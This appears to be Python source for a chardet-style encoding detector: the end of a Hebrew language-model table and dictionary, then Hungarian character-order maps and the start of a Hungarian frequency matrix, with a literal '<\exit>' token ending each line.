3,0,0,0,1,1,0,1,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,<\exit>
3,2,2,1,2,2,2,2,2,2,2,1,2,2,1,2,2,1,1,1,1,1,1,1,1,2,1,1,0,3,3,3,<\exit>
0,3,0,2,2,2,2,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
2,2,2,3,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,2,2,1,2,2,2,1,1,1,2,0,1,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,2,2,2,2,2,2,2,2,2,2,1,2,2,2,2,2,2,2,2,2,2,2,0,2,2,0,0,0,0,0,0,<\exit>
0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,3,1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,2,1,0,2,1,0,<\exit>
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,1,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
0,3,1,1,2,2,2,2,2,1,2,2,2,1,1,2,2,2,2,2,2,2,1,2,2,1,0,1,1,1,1,0,<\exit>
0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,2,1,1,1,1,2,1,1,2,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,0,0,0,0,<\exit>
0,0,2,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,0,1,0,0,<\exit>
2,1,1,2,2,2,2,2,2,2,2,2,2,2,1,2,2,2,2,2,1,2,1,2,1,1,1,1,0,0,0,0,<\exit>
0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,2,1,2,2,2,2,2,2,2,2,2,2,1,2,1,2,1,1,2,1,1,1,2,1,2,1,2,0,1,0,1,<\exit>
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,3,1,2,2,2,1,2,2,2,2,2,2,2,2,1,2,1,1,1,1,1,1,2,1,2,1,1,0,1,0,1,<\exit>
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,1,2,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,2,<\exit>
0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,1,1,1,1,1,1,1,0,1,1,0,1,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,2,0,1,1,1,0,1,0,0,0,1,1,0,1,1,0,0,0,0,0,1,1,0,0,<\exit>
0,1,1,1,2,1,2,2,2,0,2,0,2,0,1,1,2,1,1,1,1,2,1,0,1,1,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,1,0,0,0,0,0,1,0,1,2,2,0,1,0,0,1,1,2,2,1,2,0,2,0,0,0,1,2,0,1,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,2,0,2,1,2,0,2,0,0,1,1,1,1,1,1,0,1,0,0,0,1,0,0,1,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,1,0,0,0,0,0,1,0,2,1,1,0,1,0,0,1,1,1,2,2,0,0,1,0,0,0,1,0,0,1,<\exit>
1,1,2,1,0,1,1,1,0,1,0,1,1,1,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,2,2,1,<\exit>
0,2,0,1,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,1,0,0,1,0,1,1,1,1,0,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,1,1,1,1,1,1,1,1,2,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,1,1,1,0,1,1,0,1,0,0,0,1,1,0,1,<\exit>
2,0,1,0,1,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,1,0,1,1,1,0,1,0,0,1,1,2,1,1,2,0,1,0,0,0,1,1,0,1,<\exit>
1,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,0,0,2,1,1,2,0,2,0,0,0,1,1,0,1,<\exit>
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,1,0,2,1,1,0,1,0,0,2,2,1,2,1,1,0,1,0,0,0,1,1,0,1,<\exit>
2,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,0,1,1,0,1,0,0,1,0,0,0,0,1,0,1,<\exit>
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,2,1,1,1,0,2,1,1,0,0,0,2,1,0,1,<\exit>
1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,1,1,0,2,1,1,0,1,0,0,0,1,1,0,1,<\exit>
2,2,1,1,1,0,1,1,0,1,1,0,1,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,1,0,2,1,1,0,1,0,0,1,1,0,1,2,1,0,2,0,0,0,1,1,0,1,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,<\exit>
0,1,0,0,2,0,2,1,1,0,1,0,1,0,0,1,0,0,0,0,1,0,0,0,1,0,0,0,0,0,1,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,1,1,1,0,1,0,0,1,0,0,0,1,0,0,1,<\exit>
1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,0,0,0,0,0,1,0,1,1,0,0,1,0,0,2,1,1,1,1,1,0,1,0,0,0,0,1,0,1,<\exit>
0,1,1,1,2,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,1,2,1,0,0,0,0,0,1,1,1,1,1,0,1,0,0,0,1,1,0,0,<\exit>
)<\exit>
Win1255HebrewModel = {<\exit>
'charToOrderMap': win1255_CharToOrderMap,<\exit>
'precedenceMatrix': HebrewLangModel,<\exit>
'mTypicalPositiveRatio': 0.984004,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "windows-1255"<\exit>
}<\exit>
from . import constants<\exit>
Latin2_HungarianCharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253, 28, 40, 54, 45, 32, 50, 49, 38, 39, 53, 36, 41, 34, 35, 47,<\exit>
46, 71, 43, 33, 37, 57, 48, 64, 68, 55, 52,253,253,253,253,253,<\exit>
253,  2, 18, 26, 17,  1, 27, 12, 20,  9, 22,  7,  6, 13,  4,  8,<\exit>
23, 67, 10,  5,  3, 21, 19, 65, 62, 16, 11,253,253,253,253,253,<\exit>
159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,<\exit>
175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,<\exit>
191,192,193,194,195,196,197, 75,198,199,200,201,202,203,204,205,<\exit>
79,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,<\exit>
221, 51, 81,222, 78,223,224,225,226, 44,227,228,229, 61,230,231,<\exit>
232,233,234, 58,235, 66, 59,236,237,238, 60, 69, 63,239,240,241,<\exit>
82, 14, 74,242, 70, 80,243, 72,244, 15, 83, 77, 84, 30, 76, 85,<\exit>
245,246,247, 25, 73, 42, 24,248,249,250, 31, 56, 29,251,252,253,<\exit>
)<\exit>
win1250HungarianCharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253, 28, 40, 54, 45, 32, 50, 49, 38, 39, 53, 36, 41, 34, 35, 47,<\exit>
46, 72, 43, 33, 37, 57, 48, 64, 68, 55, 52,253,253,253,253,253,<\exit>
253,  2, 18, 26, 17,  1, 27, 12, 20,  9, 22,  7,  6, 13,  4,  8,<\exit>
23, 67, 10,  5,  3, 21, 19, 65, 62, 16, 11,253,253,253,253,253,<\exit>
161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,<\exit>
177,178,179,180, 78,181, 69,182,183,184,185,186,187,188,189,190,<\exit>
191,192,193,194,195,196,197, 76,198,199,200,201,202,203,204,205,<\exit>
81,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,<\exit>
221, 51, 83,222, 80,223,224,225,226, 44,227,228,229, 61,230,231,<\exit>
232,233,234, 58,235, 66, 59,236,237,238, 60, 70, 63,239,240,241,<\exit>
84, 14, 75,242, 71, 82,243, 73,244, 15, 85, 79, 86, 30, 77, 87,<\exit>
245,246,247, 25, 74, 42, 24,248,249,250, 31, 56, 29,251,252,253,<\exit>
)<\exit>
HungarianLangModel = (<\exit>
0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,2,3,3,1,1,2,2,2,2,2,1,2,<\exit>
3,2,2,3,3,3,3,3,2,3,3,3,3,3,3,1,2,3,3,3,3,2,3,3,1,1,3,3,0,1,1,1,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,<\exit>
3,2,1,3,3,3,3,3,2,3,3,3,3,3,1,1,2,3,3,3,3,3,3,3,1,1,3,2,0,1,1,1,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,1,1,2,3,3,3,1,3,3,3,3,3,1,3,3,2,2,0,3,2,3,<\exit>
0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,2,3,3,3,2,3,3,2,3,3,3,3,3,2,3,3,2,2,3,2,3,2,0,3,2,2,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,2,3,3,3,3,3,2,3,3,3,1,2,3,2,2,3,1,2,3,3,2,2,0,3,3,3,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,3,2,3,3,3,3,2,3,3,3,3,0,2,3,2,<\exit>
0,0,0,1,1,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,1,1,1,3,3,2,1,3,2,2,3,2,1,3,2,2,1,0,3,3,1,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,2,2,3,3,3,3,3,1,2,3,3,3,3,1,2,1,3,3,3,3,2,2,3,1,1,3,2,0,1,1,1,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,2,1,3,3,3,3,3,2,2,1,3,3,3,0,1,1,2,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,2,3,3,3,2,0,3,2,3,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,1,0,<\exit>
3,3,3,3,3,3,2,3,3,3,2,3,2,3,3,3,1,3,2,2,2,3,1,1,3,3,1,1,0,3,3,2,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,2,3,3,3,2,3,2,3,3,3,2,3,3,3,3,3,1,2,3,2,2,0,2,2,2,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,3,3,2,2,2,3,1,3,3,2,2,1,3,3,3,1,1,3,1,2,3,2,3,2,2,2,1,0,2,2,2,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,<\exit>
3,1,1,3,3,3,3,3,1,2,3,3,3,3,1,2,1,3,3,3,2,2,3,2,1,0,3,2,0,1,1,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,1,1,3,3,3,3,3,1,2,3,3,3,3,1,1,0,3,3,3,3,0,2,3,0,0,2,1,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,2,2,3,3,2,2,2,2,3,3,0,1,2,3,2,3,2,2,3,2,1,2,0,2,2,2,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,1,2,3,3,3,2,1,2,3,3,2,2,2,3,2,3,3,1,3,3,1,1,0,2,3,2,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,3,3,1,2,2,2,2,3,3,3,1,1,1,3,3,1,1,3,1,1,3,2,1,2,3,1,1,0,2,2,2,<\exit>
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,3,3,2,1,2,1,1,3,3,1,1,1,1,3,3,1,1,2,2,1,2,1,1,2,2,1,1,0,2,2,1,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,3,3,1,1,2,1,1,3,3,1,0,1,1,3,3,2,0,1,1,2,3,1,0,2,2,1,0,0,1,3,2,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,2,1,3,3,3,3,3,1,2,3,2,3,3,2,1,1,3,2,3,2,1,2,2,0,1,2,1,0,0,1,1,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,<\exit>
3,3,3,3,2,2,2,2,3,1,2,2,1,1,3,3,0,3,2,1,2,3,2,1,3,3,1,1,0,2,1,3,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,3,3,2,2,2,3,2,3,3,3,2,1,1,3,3,1,1,1,2,2,3,2,3,2,2,2,1,0,2,2,1,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
1,0,0,3,3,3,3,3,0,0,3,3,2,3,0,0,0,2,3,3,1,0,1,2,0,0,1,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,1,2,3,3,3,3,3,1,2,3,3,2,2,1,1,0,3,3,2,2,1,2,2,1,0,2,2,0,1,1,1,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,2,2,1,3,1,2,3,3,2,2,1,1,2,2,1,1,1,1,3,2,1,1,1,1,2,1,0,1,2,1,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
2,3,3,1,1,1,1,1,3,3,3,0,1,1,3,3,1,1,1,1,1,2,2,0,3,1,1,2,0,2,1,1,<\exit>
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,<\exit>
3,1,0,1,2,1,2,2,0,1,2,3,1,2,0,0,0,2,1,1,1,1,1,2,0,0,1,1,0,0,0,0,<\exit>
1,2,1,2,2,2,1,2,1,2,0,2,0,2,2,1,1,2,1,1,2,1,1,1,0,1,0,0,0,1,1,0,<\exit>
1,1,1,2,3,2,3,3,0,1,2,2,3,1,0,1,0,2,1,2,2,0,1,1,0,0,1,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,3,3,2,2,1,0,0,3,2,3,2,0,0,0,1,1,3,0,0,1,1,0,0,2,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,1,1,2,2,3,3,1,0,1,3,2,3,1,1,1,0,1,1,1,1,1,3,1,0,0,2,2,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,1,1,1,2,2,2,1,0,1,2,3,3,2,0,0,0,2,1,1,1,2,1,1,1,0,1,1,1,0,0,0,<\exit>
1,2,2,2,2,2,1,1,1,2,0,2,1,1,1,1,1,2,1,1,1,1,1,1,0,1,1,1,0,0,1,1,<\exit>
3,2,2,1,0,0,1,1,2,2,0,3,0,1,2,1,1,0,0,1,1,1,0,1,1,1,1,0,2,1,1,1,<\exit>
2,2,1,1,1,2,1,2,1,1,1,1,1,1,1,2,1,1,1,2,3,1,1,1,1,1,1,1,1,1,0,1,<\exit>
2,3,3,0,1,0,0,0,3,3,1,0,0,1,2,2,1,0,0,0,0,2,0,0,1,1,1,0,2,1,1,1,<\exit>
2,1,1,1,1,1,1,2,1,1,0,1,1,0,1,1,1,0,1,2,1,1,0,1,1,1,1,1,1,1,0,1,<\exit>
2,3,3,0,1,0,0,0,2,2,0,0,0,0,1,2,2,0,0,0,0,1,0,0,1,1,0,0,2,0,1,0,<\exit>
2,1,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,1,2,0,1,1,1,1,1,0,1,<\exit>
3,2,2,0,1,0,1,0,2,3,2,0,0,1,2,2,1,0,0,1,1,1,0,0,2,1,0,1,2,2,1,1,<\exit>
2,1,1,1,1,1,1,2,1,1,1,1,1,1,0,2,1,0,1,1,0,1,1,1,0,1,1,2,1,1,0,1,<\exit>
2,2,2,0,0,1,0,0,2,2,1,1,0,0,2,1,1,0,0,0,1,2,0,0,2,1,0,0,2,1,1,1,<\exit>
2,1,1,1,1,2,1,2,1,1,1,2,2,1,1,2,1,1,1,2,1,1,1,1,1,1,1,1,1,1,0,1,<\exit>
1,2,3,0,0,0,1,0,3,2,1,0,0,1,2,1,1,0,0,0,0,2,1,0,1,1,0,0,2,1,2,1,<\exit>
1,1,0,0,0,1,0,1,1,1,1,1,2,0,0,1,0,0,0,2,0,0,1,1,1,1,1,1,1,1,0,1,<\exit>
3,0,0,2,1,2,2,1,0,0,2,1,2,2,0,0,0,2,1,1,1,0,1,1,0,0,1,1,2,0,0,0,<\exit>
1,2,1,2,2,1,1,2,1,2,0,1,1,1,1,1,1,1,1,1,2,1,1,0,0,1,1,1,1,0,0,1,<\exit>
1,3,2,0,0,0,1,0,2,2,2,0,0,0,2,2,1,0,0,0,0,3,1,1,1,1,0,0,2,1,1,1,<\exit>
2,1,0,1,1,1,0,1,1,1,1,1,1,1,0,2,1,0,0,1,0,1,1,0,1,1,1,1,1,1,0,1,<\exit>
2,3,2,0,0,0,1,0,2,2,0,0,0,0,2,1,1,0,0,0,0,2,1,0,1,1,0,0,2,1,1,0,<\exit>
2,1,1,1,1,2,1,2,1,2,0,1,1,1,0,2,1,1,1,2,1,1,1,1,0,1,1,1,1,1,0,1,<\exit>
3,1,1,2,2,2,3,2,1,1,2,2,1,1,0,1,0,2,2,1,1,1,1,1,0,0,1,1,0,1,1,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,2,2,0,0,0,0,0,2,2,0,0,0,0,2,2,1,0,0,0,1,1,0,0,1,2,0,0,2,1,1,1,<\exit>
2,2,1,1,1,2,1,2,1,1,0,1,1,1,1,2,1,1,1,2,1,1,1,1,0,1,2,1,1,1,0,1,<\exit>
1,0,0,1,2,3,2,1,0,0,2,0,1,1,0,0,0,1,1,1,1,0,1,1,0,0,1,0,0,0,0,0,<\exit>
1,2,1,2,1,2,1,1,1,2,0,2,1,1,1,0,1,2,0,0,1,1,1,0,0,0,0,0,0,0,0,0,<\exit>
2,3,2,0,0,0,0,0,1,1,2,1,0,0,1,1,1,0,0,0,0,2,0,0,1,1,0,0,2,1,1,1,<\exit>
2,1,1,1,1,1,1,2,1,0,1,1,1,1,0,2,1,1,1,1,1,1,0,1,0,1,1,1,1,1,0,1,<\exit>
1,2,2,0,1,1,1,0,2,2,2,0,0,0,3,2,1,0,0,0,1,1,0,0,1,1,0,1,1,1,0,0,<\exit>
1,1,0,1,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,0,0,1,1,1,0,1,0,1,<\exit>
2,1,0,2,1,1,2,2,1,1,2,1,1,1,0,0,0,1,1,0,1,1,1,1,0,0,1,1,1,0,0,0,<\exit>
1,2,2,2,2,2,1,1,1,2,0,2,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,0,0,1,0,<\exit>
1,2,3,0,0,0,1,0,2,2,0,0,0,0,2,2,0,0,0,0,0,1,0,0,1,0,0,0,2,0,1,0,<\exit>
2,1,1,1,1,1,0,2,0,0,0,1,2,1,1,1,1,0,1,2,0,1,0,1,0,1,1,1,0,1,0,1,<\exit>
2,2,2,0,0,0,1,0,2,1,2,0,0,0,1,1,2,0,0,0,0,1,0,0,1,1,0,0,2,1,0,1,<\exit>
2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,0,1,1,1,1,1,0,1,<\exit>
1,2,2,0,0,0,1,0,2,2,2,0,0,0,1,1,0,0,0,0,0,1,1,0,2,0,0,1,1,1,0,1,<\exit>
1,0,1,1,1,1,1,1,0,1,1,1,1,0,0,1,0,0,1,1,0,1,0,1,1,1,1,1,0,0,0,1,<\exit>
1,0,0,1,0,1,2,1,0,0,1,1,1,2,0,0,0,1,1,0,1,0,1,1,0,0,1,0,0,0,0,0,<\exit>
0,2,1,2,1,1,1,1,1,2,0,2,0,1,1,0,1,2,1,0,1,1,1,0,0,0,0,0,0,1,0,0,<\exit>
2,1,1,0,1,2,0,0,1,1,1,0,0,0,1,1,0,0,0,0,0,1,0,0,1,0,0,0,2,1,0,1,<\exit>
2,2,1,1,1,1,1,2,1,1,0,1,1,1,1,2,1,1,1,2,1,1,0,1,0,1,1,1,1,1,0,1,<\exit>
1,2,2,0,0,0,0,0,1,1,0,0,0,0,2,1,0,0,0,0,0,2,0,0,2,2,0,0,2,0,0,1,<\exit>
2,1,1,1,1,1,1,1,0,1,1,0,1,1,0,1,0,0,0,1,1,1,1,0,0,1,1,1,1,0,0,1,<\exit>
1,1,2,0,0,3,1,0,2,1,1,1,0,0,1,1,1,0,0,0,1,1,0,0,0,1,0,0,1,0,1,0,<\exit>
1,2,1,0,1,1,1,2,1,1,0,1,1,1,1,1,0,0,0,1,1,1,1,1,0,1,0,0,0,1,0,0,<\exit>
2,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,2,0,0,0,<\exit>
2,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,2,1,1,0,0,1,1,1,1,1,0,1,<\exit>
2,1,1,1,2,1,1,1,0,1,1,2,1,0,0,0,0,1,1,1,1,0,1,0,0,0,0,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,1,0,1,1,1,1,1,0,0,1,1,2,1,0,0,0,1,1,0,0,0,1,1,0,0,1,0,1,0,0,0,<\exit>
1,2,1,1,1,1,1,1,1,1,0,1,0,1,1,1,1,1,1,0,1,1,1,0,0,0,0,0,0,1,0,0,<\exit>
2,0,0,0,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,1,2,0,0,1,0,0,1,0,1,0,0,0,<\exit>
